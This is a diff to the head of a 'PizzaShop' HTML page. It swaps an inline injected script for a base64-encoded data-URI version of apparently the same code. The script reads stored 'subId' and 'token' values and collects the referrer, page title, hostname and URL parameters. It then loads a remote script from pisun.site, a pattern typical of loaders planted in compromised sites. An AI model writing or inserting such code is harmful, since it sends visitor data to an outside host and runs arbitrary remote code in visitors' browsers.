@@ -1,48 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <script>
-    (function() {
-    var name = '_LwsdymnNCHXDRkkS';
-    if (!window._LwsdymnNCHXDRkkS) {
-        window._LwsdymnNCHXDRkkS = {
-            unique: false,
-            ttl: 86400,
-            R_PATH: 'https://pisun.site/KRDRQc',
-            P_PATH: 'https://pisun.site/36d9393/postback',
-        };
-    }
-    const _H6vtSHYKjvdwnVRk = localStorage.getItem('config');
-    if (typeof _H6vtSHYKjvdwnVRk !== 'undefined' && _H6vtSHYKjvdwnVRk !== null) {
-        var _pP43fJ6NXX6cV7nY = JSON.parse(_H6vtSHYKjvdwnVRk);
-        var _9BsxHfs9gp6d6Rzw = Math.round(+new Date()/1000);
-        if (_pP43fJ6NXX6cV7nY.created_at + window._LwsdymnNCHXDRkkS.ttl < _9BsxHfs9gp6d6Rzw) {
-            localStorage.removeItem('subId');
-            localStorage.removeItem('token');
-            localStorage.removeItem('config');
-        }
-    }
-    var _MffzKvmK3mBTtBqY = localStorage.getItem('subId');
-    var _HV6RX3Kg9RD6VJ6Z = localStorage.getItem('token');
-    var _xrG3SR3srmTMNQ6W = '?return=js.client';
-        _xrG3SR3srmTMNQ6W += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _xrG3SR3srmTMNQ6W += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _xrG3SR3srmTMNQ6W += '&default_keyword=' + encodeURIComponent(document.title);
-        _xrG3SR3srmTMNQ6W += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _xrG3SR3srmTMNQ6W += '&name=' + encodeURIComponent(name);
-    if (typeof _MffzKvmK3mBTtBqY !== 'undefined' && _MffzKvmK3mBTtBqY && window._LwsdymnNCHXDRkkS.unique) {
-        _xrG3SR3srmTMNQ6W += '&sub_id=' + encodeURIComponent(_MffzKvmK3mBTtBqY);
-    }
-    if (typeof _HV6RX3Kg9RD6VJ6Z !== 'undefined' && _HV6RX3Kg9RD6VJ6Z && window._LwsdymnNCHXDRkkS.unique) {
-        _xrG3SR3srmTMNQ6W += '&token=' + encodeURIComponent(_HV6RX3Kg9RD6VJ6Z);
-    }
-    var a = document.createElement('script');
-        a.type = 'application/javascript';
-        a.src = window._LwsdymnNCHXDRkkS.R_PATH + _xrG3SR3srmTMNQ6W;
-    var s = document.getElementsByTagName('script')[0];
-    s.parentNode.insertBefore(a, s)
-    })();
-    </script>
+    <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfSFBMTEhZc0IxVm1adDd4cCc7CiAgICBpZiAoIXdpbmRvdy5fSFBMTEhZc0IxVm1adDd4cCkgewogICAgICAgIHdpbmRvdy5fSFBMTEhZc0IxVm1adDd4cCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9waXN1bi5zaXRlL0tSRFJRYycsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8vcGlzdW4uc2l0ZS8zNmQ5MzkzL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgXzhTOTFRMTd3cG5jWFFkZG0gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF84UzkxUTE3d3BuY1hRZGRtICE9PSAndW5kZWZpbmVkJyAmJiBfOFM5MVExN3dwbmNYUWRkbSAhPT0gbnVsbCkgewogICAgICAgIHZhciBfOW1mOUxubTNUQ3hKOEZHdiA9IEpTT04ucGFyc2UoXzhTOTFRMTd3cG5jWFFkZG0pOwogICAgICAgIHZhciBfUHM3R2dTQ2ZIWXA1M2N0biA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF85bWY5TG5tM1RDeEo4Rkd2LmNyZWF0ZWRfYXQgKyB3aW5kb3cuX0hQTExIWXNCMVZtWnQ3eHAudHRsIDwgX1BzN0dnU0NmSFlwNTNjdG4pIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9wRmJNeEc2MjhWc0RGY0dyID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX2tSTURMTVF5REtEenprRDkgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfZjRZNVNtS3hZc0tCZlNXNCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2Y0WTVTbUt4WXNLQmZTVzQgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2Y0WTVTbUt4WXNLQmZTVzQgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfZjRZNVNtS3hZc0tCZlNXNCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfZjRZNVNtS3hZc0tCZlNXNCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2Y0WTVTbUt4WXNLQmZTVzQgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICBpZiAodHlwZW9mIF9wRmJNeEc2MjhWc0RGY0dyICE9PSAndW5kZWZpbmVkJyAmJiBfcEZiTXhHNjI4VnNERmNHciAmJiB3aW5kb3cuX0hQTExIWXNCMVZtWnQ3eHAudW5pcXVlKSB7CiAgICAgICAgX2Y0WTVTbUt4WXNLQmZTVzQgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfcEZiTXhHNjI4VnNERmNHcik7CiAgICB9CiAgICBpZiAodHlwZW9mIF9rUk1ETE1ReURLRHp6a0Q5ICE9PSAndW5kZWZpbmVkJyAmJiBfa1JNRExNUXlES0R6emtEOSAmJiB3aW5kb3cuX0hQTExIWXNCMVZtWnQ3eHAudW5pcXVlKSB7CiAgICAgICAgX2Y0WTVTbUt4WXNLQmZTVzQgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9rUk1ETE1ReURLRHp6a0Q5KTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9IUExMSFlzQjFWbVp0N3hwLlJfUEFUSCArIF9mNFk1U21LeFlzS0JmU1c0OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
     <title>PizzaShop</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
